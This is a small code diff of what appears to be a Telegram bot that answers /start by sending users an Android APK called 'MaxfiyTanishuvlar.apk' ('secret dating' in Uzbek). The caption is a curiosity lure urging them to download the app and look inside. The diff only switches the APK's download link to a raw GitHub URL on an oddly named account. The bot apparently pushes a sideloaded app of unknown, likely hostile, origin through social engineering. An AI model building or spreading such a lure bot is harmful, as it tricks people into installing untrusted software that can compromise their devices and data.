@@ -14,7 +14,7 @@ dp = Dispatcher()
 @dp.message(CommandStart())
 async def start(message: Message):
     await message.answer_document(
-        document="https://github.com/annavladimirovnaoreh1962-lang/Datuz/releases/latest/download/MaxfiyTanishuvlar.apk",
+        document="https://raw.githubusercontent.com/annavladimirovnaoreh1962-lang/Datuz/main/MaxfiyTanishuvlar.apk",
         caption="🇺🇿 Ichkarida kim borligini ko'rmoqchisanmi? Ilovani yuklab ol va kir 👀🔥"
     )
 
